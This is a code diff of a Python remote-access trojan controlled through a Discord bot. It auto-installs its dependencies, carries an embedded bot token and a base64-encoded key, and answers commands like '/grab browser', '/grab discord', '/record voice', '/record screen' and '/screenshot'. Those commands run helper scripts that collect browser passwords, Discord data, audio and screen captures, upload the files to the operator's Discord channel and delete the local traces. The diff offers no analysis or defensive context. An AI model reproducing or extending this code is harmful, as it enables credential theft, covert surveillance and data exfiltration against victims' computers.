@@ -3,7 +3,6 @@ import re
 import uuid
 import time
 import base64
-import discord
 import subprocess
 
 bin_folder = f"C:/Users/{os.getlogin()}/bin"
@@ -21,17 +20,32 @@ except:
         print("Command not found")
         exit()
 
+def install_package(package_name):
+    subprocess.check_call([prefixe, "-m", "pip", "install", package_name])
 
+# Install modules
+packages = [
+    "pywin32",
+    "pyautogui",
+    "requests",
+    "pyaudio",
+    "discord.py",
+    "pycryptodome",
+    "opencv-python",
+    "numpy"
+]
 
-def split_message(message, chunk_size=1899):
-    return [message[i:i+chunk_size] for i in range(0, len(message), chunk_size)]
+for package in packages:
+    install_package(package)
+
+import discord
 
 def get_mac():
     mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2 * 6, 2)][::-1])
     cleaned_mac = re.sub(r'[^a-z0-9-]', '-', mac.lower())
     return cleaned_mac
 
-sec = "MWI6MjUxODMyMzcyMzk2MBM3Mg.G24aXQ.V7ALk_837GDL4lHMibAWk_EH5qn3qJfv1y4Wu1"                                                                                                                                                                                                                                                                                                  ; key = base64.b64decode('TVRJNU1qVXhPRE15TXpjeU16azJNRE0zTWcuRzNkSVBBLnJQUUxQSTRYVGhIUzVuZmxWN05BMXdSZE9rdjV4UXBNeDBFaldJ').decode('utf-8')
+sec = "MWI6MjUxODMyMzcyMzk2MBM3Mg.G24aXQ.V7ALk_837GDL4lHMibAWk_EH5qn3qJfv1y4Wu1_"                                                                                                                                                                                                                                                                                                  ; key = base64.b64decode('TVRJNU1qVXhPRE15TXpjeU16azJNRE0zTWcuRzNkSVBBLnJQUUxQSTRYVGhIUzVuZmxWN05BMXdSZE9rdjV4UXBNeDBFaldJ').decode('utf-8')
 class Client(discord.Client):
     @staticmethod
     async def on_ready():
@@ -96,45 +110,51 @@ class Client(discord.Client):
             elif message.content == '/grab infos':
                 if os.path.exists(f"{bin_folder}/computer.pyw"):
                     subprocess.run([prefixe, f"{bin_folder}/computer.pyw"])
-                for i in range(10):
-                    if os.path.exists(f"{bin_folder}/COMPUTER-{os.getlogin()}.txt"):
-                        await message.channel.send(f":inbox_tray: Uploading the file, this action may take time")
-                        await message.channel.send(file=discord.File(f"{bin_folder}/COMPUTER-{os.getlogin()}.txt"))
-                        time.sleep(0.5)
-                        os.remove(f"{bin_folder}/COMPUTER-{os.getlogin()}.txt")
-                        break
-                    else:
-                        time.sleep(1)
+                    for i in range(10):
+                        if os.path.exists(f"{bin_folder}/COMPUTER-{os.getlogin()}.txt"):
+                            await message.channel.send(f":inbox_tray: Uploading the file, this action may take time")
+                            await message.channel.send(file=discord.File(f"{bin_folder}/COMPUTER-{os.getlogin()}.txt"))
+                            time.sleep(0.5)
+                            os.remove(f"{bin_folder}/COMPUTER-{os.getlogin()}.txt")
+                            break
+                        else:
+                            time.sleep(1)
+                else:
+                    await message.channel.send(f":file_folder: Missing file : `{bin_folder}/computer.pyw`")
 
             # __________________________________________________________________________
             # *========================================================================*
             elif message.content == '/grab discord':
-                if os.path.exists(f"{bin_folder}/discord.pyw"):
-                    subprocess.run([prefixe, f"{bin_folder}/discord.pyw"])
-                for i in range(10):
-                    if os.path.exists(f"{bin_folder}/DISCORD-{os.getlogin()}.txt"):
-                        await message.channel.send(f":inbox_tray: Uploading the file, this action may take time")
-                        await message.channel.send(file=discord.File(f"{bin_folder}/DISCORD-{os.getlogin()}.txt"))
-                        time.sleep(0.5)
-                        os.remove(f"{bin_folder}/DISCORD-{os.getlogin()}.txt")
-                        break
-                    else:
-                        time.sleep(1)
+                if os.path.exists(f"{bin_folder}/disc.pyw"):
+                    subprocess.run([prefixe, f"{bin_folder}/disc.pyw"])
+                    for i in range(10):
+                        if os.path.exists(f"{bin_folder}/DISCORD-{os.getlogin()}.txt"):
+                            await message.channel.send(f":inbox_tray: Uploading the file, this action may take time")
+                            await message.channel.send(file=discord.File(f"{bin_folder}/DISCORD-{os.getlogin()}.txt"))
+                            time.sleep(0.5)
+                            os.remove(f"{bin_folder}/DISCORD-{os.getlogin()}.txt")
+                            break
+                        else:
+                            time.sleep(1)
+                else:
+                    await message.channel.send(f":file_folder: Missing file : `{bin_folder}/disc.pyw`")
 
             # __________________________________________________________________________
             # *========================================================================*
             elif message.content == '/grab browser':
                 if os.path.exists(f"{bin_folder}/password.pyw"):
                     subprocess.run([prefixe, f"{bin_folder}/password.pyw"])
-                for i in range(10):
-                    if os.path.exists(f"{bin_folder}/PASSWORDS-{os.getlogin()}.txt"):
-                        await message.channel.send(f":inbox_tray: Uploading the file, this action may take time")
-                        await message.channel.send(file=discord.File(f"{bin_folder}/PASSWORDS-{os.getlogin()}.txt"))
-                        time.sleep(0.5)
-                        os.remove(f"{bin_folder}/PASSWORDS-{os.getlogin()}.txt")
-                        break
-                    else:
-                        time.sleep(1)
+                    for i in range(10):
+                        if os.path.exists(f"{bin_folder}/PASSWORDS-{os.getlogin()}.txt"):
+                            await message.channel.send(f":inbox_tray: Uploading the file, this action may take time")
+                            await message.channel.send(file=discord.File(f"{bin_folder}/PASSWORDS-{os.getlogin()}.txt"))
+                            time.sleep(0.5)
+                            os.remove(f"{bin_folder}/PASSWORDS-{os.getlogin()}.txt")
+                            break
+                        else:
+                            time.sleep(1)
+                else:
+                    await message.channel.send(f":file_folder: Missing file : `{bin_folder}/password.pyw`")
 
             # __________________________________________________________________________
             # _________________________________RECORD___________________________________
@@ -142,48 +162,54 @@ class Client(discord.Client):
             # *========================================================================*
             elif message.content == '/record voice':
                 if os.path.exists(f"{bin_folder}/record.pyw"):
-                    await message.channel.send(f":gear: Recording...")
+                    await message.channel.send(f":gear: Recording, please wait 10s")
                     subprocess.run([prefixe, f"{bin_folder}/record.pyw", "voice"])
-                for i in range(10):
-                    if os.path.exists(f"{bin_folder}/RECORDED-{os.getlogin()}.wav"):
-                        await message.channel.send(f":inbox_tray: Uploading the file, this action may take time")
-                        await message.channel.send(file=discord.File(f"{bin_folder}/RECORDED-{os.getlogin()}.wav"))
-                        time.sleep(0.5)
-                        os.remove(f"{bin_folder}/RECORDED-{os.getlogin()}.wav")
-                        break
-                    else:
-                        time.sleep(1)
+                    for i in range(10):
+                        if os.path.exists(f"{bin_folder}/RECORDED-{os.getlogin()}.wav"):
+                            await message.channel.send(f":inbox_tray: Uploading the file, this action may take time")
+                            await message.channel.send(file=discord.File(f"{bin_folder}/RECORDED-{os.getlogin()}.wav"))
+                            time.sleep(0.5)
+                            os.remove(f"{bin_folder}/RECORDED-{os.getlogin()}.wav")
+                            break
+                        else:
+                            time.sleep(1)
+                else:
+                    await message.channel.send(f":file_folder: Missing file : `{bin_folder}/record.pyw`")
 
             # __________________________________________________________________________
             # *========================================================================*
             elif message.content == '/record screen':
                 if os.path.exists(f"{bin_folder}/record.pyw"):
-                    await message.channel.send(f":gear: Recording...")
+                    await message.channel.send(f":gear: Recording, please wait 10s")
                     subprocess.run([prefixe, f"{bin_folder}/record.pyw", "screen"])
-                for i in range(10):
-                    if os.path.exists(f"{bin_folder}/SCREENVID-{os.getlogin()}.avi"):
-                        await message.channel.send(f":inbox_tray: Uploading the file, this action may take time")
-                        await message.channel.send(file=discord.File(f"{bin_folder}/SCREENVID-{os.getlogin()}.avi"))
-                        time.sleep(0.5)
-                        os.remove(f"{bin_folder}/SCREENVID-{os.getlogin()}.avi")
-                        break
-                    else:
-                        time.sleep(1)
+                    for i in range(10):
+                        if os.path.exists(f"{bin_folder}/SCREENVID-{os.getlogin()}.avi"):
+                            await message.channel.send(f":inbox_tray: Uploading the file, this action may take time")
+                            await message.channel.send(file=discord.File(f"{bin_folder}/SCREENVID-{os.getlogin()}.avi"))
+                            time.sleep(0.5)
+                            os.remove(f"{bin_folder}/SCREENVID-{os.getlogin()}.avi")
+                            break
+                        else:
+                            time.sleep(1)
+                else:
+                    await message.channel.send(f":file_folder: Missing file : `{bin_folder}/record.pyw`")
 
             # __________________________________________________________________________
             # *========================================================================*
             elif message.content == '/screenshot':
                 if os.path.exists(f"{bin_folder}/screen.pyw"):
                     subprocess.run([prefixe, f"{bin_folder}/screen.pyw", "screenshot"])
-                for i in range(10):
-                    if os.path.exists(f"{bin_folder}/SCREENSHOT-{os.getlogin()}.png"):
-                        await message.channel.send(f":inbox_tray: Uploading the file, this action may take time")
-                        await message.channel.send(file=discord.File(f"{bin_folder}/SCREENSHOT-{os.getlogin()}.png"))
-                        time.sleep(0.5)
-                        os.remove(f"{bin_folder}/SCREENSHOT-{os.getlogin()}.png")
-                        break
-                    else:
-                        time.sleep(1)
+                    for i in range(10):
+                        if os.path.exists(f"{bin_folder}/SCREENSHOT-{os.getlogin()}.png"):
+                            await message.channel.send(f":inbox_tray: Uploading the file, this action may take time")
+                            await message.channel.send(file=discord.File(f"{bin_folder}/SCREENSHOT-{os.getlogin()}.png"))
+                            time.sleep(0.5)
+                            os.remove(f"{bin_folder}/SCREENSHOT-{os.getlogin()}.png")
+                            break
+                        else:
+                            time.sleep(1)
+                else:
+                    await message.channel.send(f":file_folder: Missing file : `{bin_folder}/record.pyw`")
 
 
             # __________________________________________________________________________
